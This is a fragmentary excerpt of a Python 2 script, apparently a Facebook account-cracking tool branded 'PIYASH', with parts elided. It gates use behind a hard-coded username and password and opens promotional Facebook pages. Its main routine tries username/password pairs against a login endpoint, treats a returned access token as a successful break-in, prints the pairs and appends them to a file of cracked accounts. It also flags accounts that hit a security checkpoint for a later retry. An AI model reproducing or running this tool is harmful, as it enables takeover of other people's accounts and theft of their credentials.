...
while loop == 'true':
    ...
    if username == CorrectUsername:
        ...
        if password == CorrectPassword:
            ...
            os.system('xdg-open https://www.facebook.com/ummmah.sona.pakhi.id.link.nao')
    else:
        print '\x1b[1;97mWrong Username'
        os.system('xdg-open https://www.facebook.com/ummmah.sona.pakhi.id.link.nao')

name = raw_input('\x1b[1;92m\x1b[1;92m Enter Your Name: ')
os.system('xdg-open https://www.facebook.com/105561685523410')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[PIYASH-SUCCESSFUL]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n' + '\x1b[1;92m  [Login Now]\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + c + pass1 + '\n')
                okb.close()
                oks.append(c + user + c + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;96m[PIYASH-CHECKPOINT] \x1b[1;97m' + k + c + user + ' | ' + pass1 + '\x1b[1;96m  [Login After 07 Days]\n'
